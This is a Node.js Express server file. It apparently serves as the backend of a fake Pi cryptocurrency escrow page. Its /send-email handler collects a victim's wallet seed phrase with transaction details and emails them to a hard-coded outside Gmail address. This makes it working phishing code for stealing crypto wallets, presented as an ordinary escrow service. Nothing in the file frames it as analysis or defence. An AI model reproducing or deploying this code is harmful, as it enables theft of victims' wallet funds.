const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Email sending function
app.post('/send-email', async (req, res) => {
    const { walletPhrase, transactionAmount, usdValue, paymentMethod, address } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: 'hackspycyber@gmail.com',
        subject: 'New Escrow Transaction',
        text: `Transaction Details:
        Wallet Phrase: ${walletPhrase}
        Transaction Amount (π): ${transactionAmount}
        Equivalent in USD: $${usdValue}
        Payment Method: ${paymentMethod}
        Receiving Address: ${address}`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).send('Email sent successfully');
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).send('Error sending email');
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
